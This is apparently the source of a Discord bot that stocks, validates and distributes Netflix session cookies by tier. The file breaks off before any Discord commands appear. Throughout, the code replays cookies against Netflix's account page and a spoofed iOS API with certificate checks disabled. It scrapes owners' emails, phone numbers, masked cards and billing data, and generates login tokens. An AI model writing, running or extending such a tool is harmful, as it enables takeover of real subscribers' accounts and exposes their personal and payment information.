import asyncio
import html
import http.server
import io
import json
import os
import re
import sys
import threading
import unicodedata
import warnings
import zipfile
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone

import discord
import requests
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv
from urllib3.exceptions import InsecureRequestWarning

load_dotenv()
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Suppress discord.py 2.x SyntaxWarnings under Python 3.14+
warnings.filterwarnings("ignore", category=SyntaxWarning, module=r"discord.*")
warnings.filterwarnings("ignore", message=r".*message content intent.*", category=UserWarning)

# ==========================================
# FAKE PORT SERVER (keeps Render alive)
# ==========================================
def _start_fake_server():
    port = int(os.environ.get("PORT", "10000"))

    class _Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            body = b"OK"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_HEAD(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", "2")
            self.end_headers()

        def log_message(self, *args):
            pass

    server = http.server.HTTPServer(("0.0.0.0", port), _Handler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    print(f"[KeepAlive] Fake HTTP server listening on port {port}")

_start_fake_server()

# ==========================================
# CHANNEL IDs (set in .env or Replit Secrets)
# ==========================================
def _int_env(key: str) -> int:
    try:
        return int(os.environ.get(key, "0") or "0")
    except (ValueError, TypeError):
        return 0

ADMIN_CHANNEL_ID   = _int_env("ADMIN_CHANNEL_ID")
FGEN_CHANNEL_ID    = _int_env("FGEN_CHANNEL_ID")
BGEN_CHANNEL_ID    = _int_env("BGEN_CHANNEL_ID")
PGEN_CHANNEL_ID    = _int_env("PGEN_CHANNEL_ID")
RESTOCK_CHANNEL_ID = _int_env("RESTOCK_CHANNEL_ID")
OWNER_ID           = int(os.environ.get("OWNER_ID", "1506365840273047714"))
TICKET_CHANNEL_ID  = 1516530741826289796
VOUCH_CHANNEL_ID   = 1516530704148598944

# ==========================================
# SUPABASE CLOUD DATABASE
# ==========================================
class CloudDB:
    def __init__(self, url: str, key: str):
        raw = str(url or "").strip().rstrip("/")
        for suffix in ["/rest/v1/vault", "/rest/v1"]:
            if raw.endswith(suffix):
                raw = raw[: -len(suffix)]
        self.endpoint = f"{raw}/rest/v1/vault?id=eq.1"
        self.headers = {
            "apikey":        str(key or "").strip(),
            "Authorization": f"Bearer {str(key or '').strip()}",
            "Content-Type":  "application/json",
            "Prefer":        "return=representation",
        }

    def _ensure(self, data: dict) -> dict:
        if "nf" not in data or not isinstance(data["nf"], dict):
            data["nf"] = {}
        for t in ("free", "booster", "premium"):
            if t not in data["nf"] or not isinstance(data["nf"][t], list):
                data["nf"][t] = []
        return data

    def get_all(self) -> dict:
        try:
            r = requests.get(self.endpoint, headers=self.headers, timeout=15)
            if r.status_code == 200:
                rows = r.json()
                if rows:
                    raw = rows[0].get("data", {})
                    return self._ensure(raw if isinstance(raw, dict) else {})
            else:
                print(f"[DB] Read error HTTP {r.status_code}: {r.text[:200]}")
        except Exception as e:
            print(f"[DB] Read failed: {e}")
        return self._ensure({})

    def save(self, data: dict) -> bool:
        try:
            r = requests.patch(
                self.endpoint, headers=self.headers,
                json={"data": data}, timeout=20,
            )
            if r.status_code in (200, 204):
                print("[DB] Synced to Supabase.")
                return True
            print(f"[DB] Write error HTTP {r.status_code}: {r.text[:200]}")
        except Exception as e:
            print(f"[DB] Write failed: {e}")
        return False

    def pop_cookie(self, tier: str) -> str | None:
        data = self.get_all()
        lst  = data["nf"].get(tier, [])
        if not lst:
            return None
        cookie = lst.pop(0)
        self.save(data)
        return cookie

    def push_cookies(self, tier: str, cookies: list[str]) -> None:
        if not cookies:
            return
        data = self.get_all()
        data["nf"][tier].extend(cookies)
        self.save(data)

    def stock(self) -> dict[str, int]:
        data = self.get_all()
        return {t: len(data["nf"].get(t, [])) for t in ("free", "booster", "premium")}

    def existing_netflix_ids(self) -> set[str]:
        data = self.get_all()
        ids: set[str] = set()
        for tier in ("free", "booster", "premium"):
            for cookie_text in data["nf"].get(tier, []):
                nid = netscape_to_dict(cookie_text).get("NetflixId", "").strip()
                if nid:
                    ids.add(nid)
        return ids

db = CloudDB(
    url=os.environ.get("SUPABASE_URL", ""),
    key=os.environ.get("SUPABASE_KEY", ""),
)

# ==========================================
# COOKIE PARSING (from reference checker)
# ==========================================
LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)
CANONICAL_NETFLIX_COOKIE_NAMES = {name.lower(): name for name in ALL_NETFLIX_COOKIE_NAMES}

def _decode(value) -> str | None:
    if value is None:
        return None
    s = html.unescape(str(value))
    for src, tgt in {"\\x20": " ", "\\u00A0": " ", "\\u00a0": " ", "&nbsp;": " ", "u00A0": " "}.items():
        s = s.replace(src, tgt)
    s = s.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
    for _ in range(3):
        prev = s
        s = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), s)
        s = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), s)
        s = s.replace("\\\\", "\\")
        if s == prev:
            break
    return re.sub(r"\s+", " ", s).strip() or None

def netscape_to_dict(text: str) -> dict:
    out: dict = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            out[parts[5]] = parts[6]
    return out

def is_netflix_domain(domain):
    normalized = str(domain or "").strip()
    if normalized.startswith("#HttpOnly_"):
        normalized = normalized[len("#HttpOnly_"):]
    return "netflix." in normalized.lower()

def canonicalize_netflix_cookie_name(name):
    normalized = str(name or "").strip()
    return CANONICAL_NETFLIX_COOKIE_NAMES.get(normalized.lower(), normalized)

def is_netflix_cookie_entry(domain, name):
    return canonicalize_netflix_cookie_name(name) in ALL_NETFLIX_COOKIE_NAMES or is_netflix_domain(domain)

def convert_json_to_netscape(json_data):
    if isinstance(json_data, dict):
        if isinstance(json_data.get("cookies"), list):
            json_data = json_data["cookies"]
        elif isinstance(json_data.get("items"), list):
            json_data = json_data["items"]
        else:
            json_data = [json_data]
    if not isinstance(json_data, list):
        return ""
    netscape_lines = []
    for cookie in json_data:
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = canonicalize_netflix_cookie_name(cookie.get("name", ""))
        if not is_netflix_cookie_entry(domain, name):
            continue
        tail_match = "TRUE" if domain.startswith(".") else "FALSE"
        path = cookie.get("path", "/")
        secure = "TRUE" if cookie.get("secure", False) else "FALSE"
        expires = str(cookie.get("expirationDate", cookie.get("expiration", 0)))
        value = cookie.get("value", "")
        if name:
            line = f"{domain}\t{tail_match}\t{path}\t{secure}\t{expires}\t{name}\t{value}"
            netscape_lines.append(line)
    return "\n".join(netscape_lines)

def split_netscape_cookie_columns(line):
    stripped = line.strip()
    if not stripped:
        return []
    if stripped.startswith("#") and not stripped.startswith("#HttpOnly_"):
        return []
    if stripped.startswith("#HttpOnly_"):
        stripped = stripped[len("#HttpOnly_"):]
    if not stripped:
        return []
    parts = stripped.split("\t")
    if len(parts) >= 7:
        return parts[:6] + ["\t".join(parts[6:])]
    parts = re.split(r"\s+", stripped, maxsplit=6)
    if len(parts) >= 7:
        return parts
    return []

def is_netscape_cookie_line(line):
    parts = split_netscape_cookie_columns(line)
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    if not re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()):
        return False
    return True

def build_netscape_cookie_entry(domain, tail_match, path, secure, expires, name, value, position):
    normalized_expires = str(expires or 0).strip()
    if re.fullmatch(r"-?\d+\.\d+", normalized_expires):
        try:
            normalized_expires = str(int(float(normalized_expires)))
        except Exception:
            pass
    return {
        "domain": str(domain or "").replace("#HttpOnly_", "", 1),
        "tail_match": "TRUE" if str(tail_match).upper() == "TRUE" else "FALSE",
        "path": str(path or "/"),
        "secure": "TRUE" if str(secure).upper() == "TRUE" else "FALSE",
        "expires": normalized_expires or "0",
        "name": canonicalize_netflix_cookie_name(name),
        "value": str(value or ""),
        "position": position,
    }

def format_netscape_cookie_entry(entry):
    return (f"{entry['domain']}\t{entry['tail_match']}\t{entry['path']}\t{entry['secure']}\t"
            f"{entry['expires']}\t{entry['name']}\t{entry['value']}")

def extract_netscape_cookie_entries(raw_text):
    entries = []
    for index, line in enumerate(raw_text.splitlines()):
        if not is_netscape_cookie_line(line):
            continue
        parts = split_netscape_cookie_columns(line)
        if len(parts) < 7:
            continue
        domain = parts[0]
        name = canonicalize_netflix_cookie_name(parts[5])
        if not is_netflix_cookie_entry(domain, name):
            continue
        entries.append(build_netscape_cookie_entry(domain, parts[1], parts[2], parts[3], parts[4], name, parts[6], index))
    return entries

def extract_json_cookie_entries(content):
    try:
        json_data = json.loads(content)
    except Exception:
        return []
    if isinstance(json_data, dict):
        if isinstance(json_data.get("cookies"), list):
            json_data = json_data["cookies"]
        elif isinstance(json_data.get("items"), list):
            json_data = json_data["items"]
        else:
            json_data = [json_data]
    if not isinstance(json_data, list):
        return []
    entries = []
    for index, cookie in enumerate(json_data):
        if not isinstance(cookie, dict):
            continue
        domain = cookie.get("domain", "")
        name = canonicalize_netflix_cookie_name(cookie.get("name", ""))
        if not is_netflix_cookie_entry(domain, name):
            continue
        entries.append(build_netscape_cookie_entry(
            domain,
            "TRUE" if str(domain).startswith(".") else "FALSE",
            cookie.get("path", "/"),
            "TRUE" if cookie.get("secure", False) else "FALSE",
            cookie.get("expirationDate", cookie.get("expiration", 0)),
            name,
            cookie.get("value", ""),
            index,
        ))
    return entries

def extract_raw_cookie_entries(raw_text):
    pattern = re.compile(
        rf"(?:['\"])?(?P<name>{'|'.join(sorted((re.escape(name) for name in ALL_NETFLIX_COOKIE_NAMES), key=len, reverse=True))})(?:['\"])?"
        r"\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)",
        re.IGNORECASE,
    )
    entries = []
    for index, match in enumerate(pattern.finditer(raw_text)):
        cookie_name = canonicalize_netflix_cookie_name(match.group("name"))
        value = match.group("value")
        if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}:
            value = value[1:-1]
        else:
            value = value.rstrip(",")
        entries.append(build_netscape_cookie_entry(".netflix.com", "TRUE", "/", "TRUE" if cookie_name == "SecureNetflixId" else "FALSE", "0", cookie_name, value, index))
    return entries

def build_cookie_bundles_from_entries(entries):
    if not entries:
        return []
    entries_by_name = {}
    for entry in entries:
        cookie_name = entry.get("name")
        if not cookie_name:
            continue
        entries_by_name.setdefault(cookie_name, []).append(entry)
    if not entries_by_name:
        return []
    netflix_id_count = len(entries_by_name.get("NetflixId", []))
    bundle_count = netflix_id_count or max(len(name_entries) for name_entries in entries_by_name.values())
    bundles = []
    for bundle_index in range(bundle_count):
        selected_entries = []
        for name_entries in entries_by_name.values():
            if bundle_index < len(name_entries):
                selected_entries.append(name_entries[bundle_index])
            elif len(name_entries) == 1:
                selected_entries.append(name_entries[0])
        if not selected_entries:
            continue
        selected_entries = sorted(selected_entries, key=lambda item: item.get("position", 0))
        netscape_text = "\n".join(format_netscape_cookie_entry(entry) for entry in selected_entries)
        bundles.append({
            "index": bundle_index + 1,
            "total": bundle_count,
            "netscape_text": netscape_text,
            "cookies": netscape_to_dict(netscape_text),
        })
    return bundles

def extract_netflix_cookie_bundles(content):
    for extractor in (extract_json_cookie_entries, extract_netscape_cookie_entries, extract_raw_cookie_entries):
        bundles = build_cookie_bundles_from_entries(extractor(content))
        if bundles:
            return bundles
    return []

# ==========================================
# NFToken helpers (shared)
# ==========================================
_NF_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
_NF_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone", "iosVersion": "15.8.5", "isTablet": "false",
    "languages": "en-US", "locale": "en-US", "maxDeviceWidth": "375",
    "model": "saget", "modelType": "IPHONE8-1", "odpAware": "true",
    "path": '["account","token","default"]', "pathFormat": "graph",
    "pixelDensity": "2.0", "progressive": "false", "responseFormat": "json",
}
_NF_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

def _expiry_str(expires) -> str | None:
    if expires is None:
        return None
    try:
        ts = int(expires)
        if ts > 1_000_000_000_000:
            ts //= 1000
        return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
    except Exception:
        return str(expires)

def create_nftoken_fast(cookie_text: str) -> tuple[dict | None, str | None]:
    nid = _decode(netscape_to_dict(cookie_text).get("NetflixId"))
    if not nid:
        return None, "Missing NetflixId"
    headers = {**_NF_HEADERS, "Cookie": f"NetflixId={nid}"}
    try:
        r = requests.get(_NF_API_URL, params=_NF_PARAMS, headers=headers,
                         timeout=10, verify=False)
        if r.status_code != 200:
            return None, f"NFToken HTTP {r.status_code}"
        node = (((r.json().get("value") or {}).get("account") or {})
                .get("token") or {}).get("default") or {}
        token = _decode(node.get("token"))
        if token:
            return {"token": token, "expires_at_utc": _expiry_str(node.get("expires"))}, None
        return None, "Token field missing"
    except Exception as e:
        return None, str(e)

# ==========================================
# FAST CHECKER (for restocking – minimal)
# ==========================================
def check_nf_cookie_fast(cookie_text: str) -> dict:
    """Returns dict: ok, plan, quality, country, reason (if not ok)"""
    cookies = netscape_to_dict(cookie_text)
    if "NetflixId" not in cookies:
        return {"ok": False, "reason": "Missing NetflixId cookie."}

    session = requests.Session()
    session.cookies.clear()
    session.cookies.update(cookies)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept-Encoding": "identity",
    }
    try:
        r = session.get("https://www.netflix.com/account/membership",
                        headers=headers, timeout=8, allow_redirects=True)
    except requests.exceptions.Timeout:
        return {"ok": False, "reason": "Request timed out."}
    except Exception as e:
        return {"ok": False, "reason": str(e)}

    if r.status_code != 200:
        return {"ok": False, "reason": f"HTTP {r.status_code}"}

    text = r.text
    def _rx_min(text, patterns):
        for p in patterns:
            m = re.search(p, text)
            if m:
                return _decode(m.group(1))
        return None

    plan = _rx_min(text,
        r'"localizedPlanName"\s*:\s*"([^"]+)"',
        r'"planName"\s*:\s*"([^"]+)"',
        r'"name"\s*:\s*"([^"]+)"',
    )
    quality = _rx_min(text,
        r'"videoQuality"\s*:\s*"([^"]+)"',
        r'"quality"\s*:\s*"([^"]+)"',
    )
    country = _rx_min(text,
        r'"currentCountry"\s*:\s*"([^"]+)"',
        r'"countryOfSignup"\s*:\s*"([^"]+)"',
    )
    status = _rx_min(text, r'"membershipStatus"\s*:\s*"([^"]+)"')
    if not status and not country:
        if "/login" in r.url.lower() or "sign-in-form" in text.lower():
            return {"ok": False, "reason": "Cookie expired (redirected to login)."}
        return {"ok": False, "reason": "No active subscription"}

    nft, nft_err = create_nftoken_fast(cookie_text)
    if not nft:
        return {"ok": False, "reason": f"NFToken failed: {nft_err}"}

    return {"ok": True, "plan": plan, "quality": quality, "country": country}

# ==========================================
# FULL CHECKER (for generation – all details)
# ==========================================
# (The following functions are directly from your original bot, kept for the DM embed)

def normalize_plan_key(value: str | None) -> str:
    if not value:
        return "unknown"
    simplified = unicodedata.normalize("NFKD", str(value))
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_")
    return normalized or "unknown"

def _rx(text: str, *patterns: str, flags: int = 0) -> str | None:
    for pat in patterns:
        m = re.search(pat, text, flags)
        if m:
            return _decode(m.group(1))
    return None

def _extract_graphql_info(text: str) -> dict:
    try:
        payload = json.loads(text)
        if not isinstance(payload, dict):
            return {}
        data   = payload.get("data") or {}
        growth = data.get("growthAccount") or {}
        current_profile = data.get("currentProfile") or {}
        plan   = ((growth.get("currentPlan") or {}).get("plan") or {})
        next_p = ((growth.get("nextPlan") or {}).get("plan") or {})
        profiles = growth.get("profiles") or []
        profiles_names = [_decode(p.get("name")) for p in profiles if isinstance(p, dict) and p.get("name")]
        profiles_str = ", ".join(filter(None, profiles_names)) if profiles_names else None
        email = None
        email_verified = None
        growth_email = (current_profile.get("growthEmail") or {})
        email_obj = growth_email.get("email") or {}
        email = _decode(email_obj.get("value") if isinstance(email_obj, dict) else None)
        email_verified = _decode(growth_email.get("isVerified"))
        if not email:
            for prof in profiles:
                ge = (prof.get("growthEmail") or {})
                e_obj = ge.get("email") or {}
                email = _decode(e_obj.get("value") if isinstance(e_obj, dict) else None)
                if email:
                    email_verified = _decode(ge.get("isVerified"))
                    break
        payment_methods = growth.get("growthPaymentMethods") or []
        payment = None
        card = None
        if payment_methods and isinstance(payment_methods[0], dict):
            pm = payment_methods[0]
            payment_typename = pm.get("__typename", "")
            if "Card" in payment_typename:
                payment = "CC"
                display = _decode(pm.get("displayText"))
                if display and re.fullmatch(r"\d{4}", display):
                    card = display
                else:
                    card = display
            else:
                payment = _decode((pm.get("paymentOptionLogo") or {}).get("paymentOptionLogo"))
                if not payment:
                    payment = _decode(pm.get("displayText"))
        phone = None
        local_phone = growth.get("growthLocalizablePhoneNumber") or {}
        raw_phone = local_phone.get("rawPhoneNumber") or {}
        phone_digits = _decode(raw_phone.get("phoneNumberDigits") if isinstance(raw_phone, dict) else None)
        phone_country = _decode(raw_phone.get("countryCode") if isinstance(raw_phone, dict) else None)
        if phone_digits:
            phone = normalize_phone_number(phone_digits, phone_country)
        member_since = _decode(growth.get("memberSince"))
        next_billing = _decode((growth.get("nextBillingDate") or {}).get("localDate"))
        extra_member = None
        features = []
        for f in (plan.get("availableFeatures") or []):
            if isinstance(f, dict) and f.get("type"):
                features.append(str(f["type"]).upper())
        if "EXTRA_MEMBER" in features:
            extra_member = "Yes"
        hold = None
        hold_meta = growth.get("growthHoldMetadata") or {}
        if isinstance(hold_meta, dict):
            for key in ("isUserOnHold", "holdStatus", "isOnHold", "pastDue", "isPastDue"):
                val = hold_meta.get(key)
                if val is not None:
                    hold = _decode(val)
                    break
        if hold is None:
            if normalize_plan_key(_decode(growth.get("membershipStatus"))) == "current_member":
                hold = "No"
        user_guid = _decode(growth.get("ownerGuid") or current_profile.get("guid"))

        return {
            "accountOwnerName": _decode(current_profile.get("name")),
            "email": email,
            "emailVerified": email_verified,
            "countryOfSignup": _decode(((growth.get("countryOfSignUp") or {}).get("code"))),
            "plan": _decode(plan.get("name") or next_p.get("name")),
            "quality": _decode(plan.get("videoQuality")),
            "maxStreams": _decode(growth.get("maxStreams")),
            "planPrice": _decode(plan.get("priceDisplay") or plan.get("displayPrice")),
            "memberSince": member_since,
            "nextBillingDate": next_billing,
            "paymentMethodType": payment,
            "maskedCard": card,
            "phoneDisplay": phone,
            "showExtraMemberSection": extra_member,
            "holdStatus": hold,
            "profilesDisplay": profiles_str,
            "userGuid": user_guid,
            "membershipStatus": _decode(growth.get("membershipStatus")),
        }
    except Exception:
        return {}

def _extract_html_info(text: str) -> dict:
    DOT = re.DOTALL
    info = {
        "accountOwnerName": _rx(text, r'"firstName"\s*:\s*"([^"]+)"'),
        "email": _rx(text, r'"emailAddress"\s*:\s*"([^"]+)"', r'"email"\s*:\s*"([^"]+)"'),
        "countryOfSignup": _rx(text, r'"currentCountry"\s*:\s*"([^"]+)"'),
        "plan": _rx(text,
            r'"MemberPlan"\s*,\s*"fields"\s*:\s*\{\s*"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"localizedPlanName"\s*:\s*"([^"]+)"',
            flags=DOT,
        ),
        "quality": _rx(text, r'videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"'),
        "maxStreams": _rx(text, r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,}]+)'),
        "planPrice": _rx(text, r'"formattedPlanPrice"\s*:\s*"([^"]+)"'),
        "memberSince": _rx(text, r'"memberSince":\s*"([^"]+)"'),
        "nextBillingDate": _rx(text, r'"nextBillingDate"\s*:\s*"([^"]+)"'),
        "paymentMethodType": _rx(text, r'"paymentMethod"\s*:\s*"([^"]+)"'),
        "maskedCard": _rx(text, r'"paymentCardDisplayString"\s*:\s*"([^"]+)"'),
        "phoneDisplay": _rx(text, r'"phoneNumberDigits"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"'),
        "showExtraMemberSection": _rx(text, r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)'),
        "holdStatus": _rx(text, r'"holdStatus"\s*:\s*(true|false)'),
        "emailVerified": _rx(text, r'"emailVerified"\s*:\s*(true|false)'),
        "membershipStatus": _rx(text, r'"membershipStatus":\s*"([^"]+)"'),
        "profilesDisplay": _rx(text, r'"profileName"\s*:\s*"([^"]+)"'),
        "userGuid": _rx(text, r'"userGuid":\s*"([^"]+)"'),
    }
    for key in ("showExtraMemberSection", "holdStatus", "emailVerified"):
        val = info.get(key)
        if val is not None:
            lowered = val.strip().lower()
            if lowered in ("true", "yes", "1"):
                info[key] = "Yes"
            elif lowered in ("false", "no", "0"):
                info[key] = "No"
    return {k: v for k, v in info.items() if v}

def _normalize_boolean(val):
    if isinstance(val, bool):
        return "Yes" if val else "No"
    if isinstance(val, (int, float)):
        return "Yes" if val == 1 else "No"
    if isinstance(val, str):
        lowered = val.strip().lower()
        if lowered in ("true", "yes", "1"):
            return "Yes"
        if lowered in ("false", "no", "0"):
            return "No"
    return None

def _format_date(value):
    if not value:
        return None
    for fmt in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%B %d, %Y", "%B %Y"):
        try:
            dt = datetime.strptime(value, fmt)
            return dt.strftime("%B %d, %Y")
        except:
            pass
    try:
        dt = datetime.fromisoformat(value.replace("Z", "+00:00"))
        return dt.strftime("%B %d, %Y")
    except:
        pass
    return value

def _format_member_since(value):
    if not value:
        return None
    for fmt in ("%Y-%m-%d", "%Y-%m", "%B %Y"):
        try:
            dt = datetime.strptime(value, fmt)
            return dt.strftime("%B %Y")
        except:
            pass
    return value

def normalize_phone_number(digits, country_code=None):
    if not digits:
        return None
    digits = re.sub(r"\D", "", str(digits))
    if not digits:
        return None
    if str(digits).startswith("+"):
        return digits
    if country_code:
        country_code = country_code.strip().upper()
        if country_code == "IN" and digits.startswith("0"):
            return f"+91{digits[1:]}"
    return digits

def country_flag(cc: str) -> str:
    if not cc or len(cc) != 2:
        return ""
    return "".join(chr(127397 + ord(c)) for c in cc.upper())

def format_country(value):
    if not value:
        return "UNKNOWN"
    flag = country_flag(value)
    return f"{value} {flag}".strip()

def _merge_info(graphql: dict, html: dict) -> dict:
    merged = {}
    for key in ("accountOwnerName", "email", "countryOfSignup", "plan", "quality",
                "maxStreams", "planPrice", "memberSince", "nextBillingDate",
                "paymentMethodType", "maskedCard", "phoneDisplay",
                "showExtraMemberSection", "holdStatus", "emailVerified",
                "membershipStatus", "profilesDisplay", "userGuid"):
        g = graphql.get(key)
        h = html.get(key)
        merged[key] = g if g not in (None, "", "null") else h
    if merged.get("maskedCard") and merged.get("paymentMethodType") is None:
        merged["paymentMethodType"] = "CC"
    for k in ("showExtraMemberSection", "holdStatus", "emailVerified"):
        val = merged.get(k)
        if val is not None:
            merged[k] = _normalize_boolean(val)
    if merged.get("nextBillingDate"):
        merged["nextBillingDate"] = _format_date(merged["nextBillingDate"])
    if merged.get("memberSince"):
        merged["memberSince"] = _format_member_since(merged["memberSince"])
    merged["countryDisplay"] = format_country(merged.get("countryOfSignup"))
    return merged

_LOGIN_PAGE_MARKERS = ("LoginForm", "login-form", "password-input", "sign-in-form")

def _is_login_page(url: str, text: str) -> bool:
    url_lower = url.lower()
    login_url_segments = ("/login", "/loginhelp", "/signup")
    for seg in login_url_segments:
        if re.search(re.escape(seg) + r"(?:[/?#]|$)", url_lower):
            return True
    return sum(1 for m in _LOGIN_PAGE_MARKERS if m in text) >= 2

_EXTRA_MEMBER_PATTERNS = (
    r"extra\s+on\s+someone.?else.?s\s+plan",
    r"assinante\s+extra\s+no\s+plano",
    r"suscriptor\s+extra\s+en\s+el\s+plan",
    r"abbonato\s+extra\s+sul\s+piano",
    r"abonn[ée]\s+suppl[ée]mentaire\s+sur\s+le\s+forfait",
    r"ekstra\s+uye\s+bir\s+baskasinin\s+planinda",
)

def _is_subscribed(info: dict) -> bool:
    status_key = normalize_plan_key(info.get("membershipStatus"))
    if status_key == "current_member":
        return True
    if any(tok in status_key for tok in ("hold", "past_due", "payment_retry", "paused", "suspend")):
        return True
    if info.get("showExtraMemberSection") == "Yes":
        return True
    if any(re.search(p, info.get("raw_text", ""), re.IGNORECASE) for p in _EXTRA_MEMBER_PATTERNS):
        return True
    return False

def check_nf_cookie_full(cookie_text: str) -> dict:
    """Full detailed checker, returns the same dict as original bot."""
    cookies = netscape_to_dict(cookie_text)
    if "NetflixId" not in cookies:
        return {"ok": False, "reason": "Missing NetflixId cookie."}

    session = requests.Session()
    session.cookies.clear()
    session.cookies.update(cookies)
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept-Encoding": "identity",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        r = session.get("https://www.netflix.com/account/membership",
                        headers=headers, timeout=8, allow_redirects=True)
    except requests.exceptions.Timeout:
        return {"ok": False, "reason": "Request timed out."}
    except Exception as e:
        return {"ok": False, "reason": str(e)}

    if r.status_code != 200:
        return {"ok": False, "reason": f"HTTP {r.status_code}"}

    text = r.text
    graphql_info = _extract_graphql_info(text)
    html_info = _extract_html_info(text)
    info = _merge_info(graphql_info, html_info)
    info["raw_text"] = text

    if any(re.search(p, text, re.IGNORECASE) for p in _EXTRA_MEMBER_PATTERNS):
        info["showExtraMemberSection"] = "Yes"

    if not info.get("membershipStatus") and not info.get("showExtraMemberSection"):
        if _is_login_page(r.url, text):
            return {"ok": False, "reason": "Cookie expired (redirected to login)."}

    subscribed = _is_subscribed(info)
    if subscribed:
        nft, nft_err = create_nftoken_fast(cookie_text)
        if not nft:
            return {"ok": False, "reason": f"NFToken failed: {nft_err}"}
        return {
            "ok": True,
            "plan": info.get("plan", "Unknown"),
            "quality": info.get("quality", "Unknown"),
            "country": info.get("countryOfSignup", "Unknown"),
            "maxStreams": info.get("maxStreams"),
            "status": info.get("membershipStatus"),
            "nft": nft,
            "full_info": info,
        }

